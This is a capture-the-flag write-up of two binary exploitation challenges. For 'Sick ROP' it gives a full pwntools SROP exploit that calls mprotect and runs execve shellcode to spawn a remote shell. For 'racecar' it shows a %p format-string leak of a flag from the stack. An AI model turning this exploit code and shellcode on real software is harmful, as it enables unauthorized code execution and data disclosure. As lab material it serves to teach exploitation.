# Sick ROP

First I look what `file` are we dealing with and see that this one is statically compiled.
`sick_rop: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, not stripped`

Then I run checksec to see it's mitigations.

```bash
└─$ checksec --file=sick_rop  
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY  Fortified  Fortifiable  FILE
No RELRO        No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   10 Symbols        No     0          0            sick_rop
```

Spotting a buffer overflow immediately (the function puts 0x300 bytes on the stack but 0x20 bytes are reserved for our buffer.

```bash
000000000040102e <vuln>:
  40102e:       55                      push   rbp
  40102f:       48 89 e5                mov    rbp,rsp
  401032:       48 83 ec 20             sub    rsp,0x20
  401036:       49 89 e2                mov    r10,rsp
  401039:       68 00 03 00 00          push   0x300
  40103e:       41 52                   push   r10
  401040:       e8 bb ff ff ff          call   401000 <read>
  401045:       50                      push   rax
  401046:       41 52                   push   r10
  401048:       e8 ca ff ff ff          call   401017 <write>
  40104d:       c9                      leave
  40104e:       c3                      ret
```

As the name of this challenge suggest, there might be some ROP gadget building for this (since NX is enabled as well) so let's get into it.

Checking the gadgets available for this challenge that we have (`read`, `write`, `syscall`, `ret`).

```bash
0x0000000000401012 : and al, 0x10 ; syscall
0x000000000040100d : and al, 8 ; mov rdx, qword ptr [rsp + 0x10] ; syscall
0x0000000000401044 : call qword ptr [rax + 0x41]
0x000000000040104c : dec ecx ; ret
0x000000000040100c : je 0x401032 ; or byte ptr [rax - 0x75], cl ; push rsp ; and al, 0x10 ; syscall
0x0000000000401023 : je 0x401049 ; or byte ptr [rax - 0x75], cl ; push rsp ; and al, 0x10 ; syscall
0x0000000000401054 : jmp 0x40104f
0x000000000040104d : leave ; ret
0x0000000000401010 : mov edx, dword ptr [rsp + 0x10] ; syscall
0x000000000040100b : mov esi, dword ptr [rsp + 8] ; mov rdx, qword ptr [rsp + 0x10] ; syscall
0x000000000040100f : mov rdx, qword ptr [rsp + 0x10] ; syscall
0x000000000040100e : or byte ptr [rax - 0x75], cl ; push rsp ; and al, 0x10 ; syscall
0x0000000000401011 : push rsp ; and al, 0x10 ; syscall
0x0000000000401016 : ret
0x0000000000401049 : retf 0xffff
0x0000000000401014 : syscall
```

I was quite unsure at the first but then I looked into it and found out we can do SROP with these instead.
In SROP there is a `sys_rt_sigreturn` syscall that restores stack frame into registers.
Storing this we can call `mprotect`, rewrite permissions for stack execution and get a shell.	

Using [rchapman's syscall table](https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/) as a reference for building a shellcode for `sys_rt_sigreturn` (rax = 0xf) and `sys_mprotect`.


Since we have plenty space for this we will craft the payload for overwriting `$RIP`
> offset + vuln_addr + syscall_ret + frame_padding
and then call `sys_rt_sigreturn`.

This configuration will now call `vuln()` function, add 0x15 (that should be in `$RAX` for this syscall to work properly). Reset the previously stored register configuration back and finally `syscall; ret`.

Adjusting correct offsets for overflowing the right bytes and then for the shellcode use `execve(/bin/bash)`

```python
#!/usr/bin/env python3
import sys
from pwn import *

context.binary = 'sick_rop'
elf = context.binary
rop = ROP(elf)
p = remote(sys.argv[1], sys.argv[2])

f = SigreturnFrame()
f.rax = 10            # sys_mprotect
f.rdi = elf.address
f.rsi = 0x4000        # size
f.rdx = 0b111         # rwx
f.rsp = 0x4010d8
f.rip = rop.find_gadget(['syscall', 'ret'])[0] # syscall ret;

payload  = b'A' * 40
payload += p64(elf.symbols.vuln)
payload += p64(rop.find_gadget(['syscall', 'ret'])[0] ) # syscall ret;
payload += bytes(f)

p.sendline(payload)
p.recv()

p.send(b'A' * 15) # sys_rt_sigreturn
p.recv()

shellcode = (b'\x48\x31\xf6\x56\x48\xbf\x2f\x62'
             b'\x69\x6e\x2f\x2f\x73\x68\x57\x54'
             b'\x5f\x6a\x3b\x58\x99\x0f\x05')
payload = b'A' * 40 + p64(0x4010e8) + shellcode
p.send(payload)
p.recv()

print(p.interactive())

```

# racecar

```bash
└─$ file racecar                                
racecar: ELF 32-bit LSB pie executable, Intel i386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=c5631a370f7704c44312f6692e1da56c25c1863c, not stripped
```

```bash
└─$ checksec --file=racecar         
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY  Fortified  Fortifiable  FILE
Full RELRO      Canary found      NX enabled    PIE enabled     No RPATH   No RUNPATH   96 Symbols      No       0  	    3 		 racecar
```

Since all mitigations are enabled I am just looking for any leaks and I find `fgets`.

```c
...
char buf[0x2c];
fgets(&buf, 0x2c, fp);
read(0, eax_71, 0x170);
puts("\n\x1b[3mThe Man, the Myth, the …");
result = printf(eax_71);
```
There is a specific combination of inputs to reach this part of the code after running the binary:
any, any, 2, 2, 1
You need to create `flag.txt` locally to bypass the `if` above this code, then you are prompted with input for `fgets`. Here I leak pointer addresses with `%p` because the flag is on the stack.

```bash
[!] Do you have anything to say to the press after your big victory?                                                
>  %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p

The Man, the Myth, the Legend! The grand winner of the race wants the whole world to know this: 
 0x584e3200 0x170 0x5662fdfa 0x11 0x3 0x26 0x2 0x1 0x5663096c 0x584e3200 0x584e3380 0x56630540 0x56630538 0xf7d6ee55 0x700f900 0x56630d58 0x56632f8c 0xff824128 0x5663038d 0x56630540 0x584e31a0 0x2 0x700f900 (nil) 0x56632f8c 0xff824148 0x56630441 (nil) (nil) (nil) 0x700f900 0xff824160 0xf7f47e14 (nil) 0xf7d39cc3 (nil) 0xff824214 0xf7d53029 0xf7d39cc3 0x1 0xff824214 0xff82421c 0xff824180 0xf7f47e14 0x566303e1 0x1 0xff824214 0xf7f47e14 0x56630490 0xf7fabb60 (nil) 0x163b73a2 0xb580b5b2 (nil) (nil) (nil) 0xf7fabb60 (nil) 0x700f900 0xf7faca60 0xf7d39c56 0xf7f47e14 0xf7d39d88 0xf7f76ac4 0x8 (nil) (nil) (nil) (nil) 0xf7d39d09 0x56632f8c 0x1
```

The just read it with correct endianness and convert to ASCII.




